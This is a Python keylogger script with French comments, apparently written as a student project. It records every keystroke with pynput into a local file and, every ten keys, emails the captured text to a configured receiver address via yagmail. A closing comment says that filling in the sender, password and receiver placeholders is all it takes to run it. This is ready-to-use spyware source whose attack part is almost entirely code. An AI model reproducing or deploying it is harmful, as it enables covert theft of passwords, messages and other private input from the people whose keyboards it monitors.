import yagmail
import time
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.application import MIMEApplication
from pynput import keyboard

# On rentre les informations sur notre adresse e-mail
email_address = '@emetteur'
email_password = 'mdp'

# On rentre les informations sur le destinataire
email_receiver = '@recepteur'  # C'est la boîte mail où l'on
# enverra le fichier keylogger généré

def send_email(file_content):
    # Contenu du message
    body = file_content
    yag = yagmail.SMTP(email_address, email_password)
    yag.send(email_receiver, 'keylogger', body)
    print("Mail envoyé")

compteur = 0

def keyPressed(key):
    global compteur
    try:
        char = str(key.char)
    except AttributeError:
        # Handle spacebar, enter, tab.
        if key == keyboard.Key.space:
            char = ' '
        elif key == keyboard.Key.tab:
            char = '\t'
        elif key == keyboard.Key.enter:
            char = '\n'
        # Ignore special keys such as ctrl, alt, shift, etc.
        else:
            char = str(key).replace('Key.', ' ')
    
    print(char, end='')
    
    with open("keyfile.txt", 'a') as logKey:
        logKey.write(char)
    
    compteur += 1

    if compteur == 10:
        # Lecture du contenu du fichier keyfile.txt
        with open("D:\\Home\\S4 GINF EMI\\PI_S4\\PI_S4_Code\\keyfile.txt", 'r') as f:
            file_content = f.read()
        # Envoi de l'e-mail
        send_email(file_content)
        compteur = 0

# Démarrage de l'écouteur de touches du clavier
listener = keyboard.Listener(on_press=keyPressed)
listener.start()

# Boucle principale
while True:
    try:
        # Pass when keyboard interrupt (CTRL + C) is not pressed
        pass
    except KeyboardInterrupt:
        listener.stop()
        listener.join()

# Pour exécuter le code ci-dessus, il suffit de remplacer les champs : ‘@emetteur’ et ‘@recepteur’ ainsi que ‘mdp’.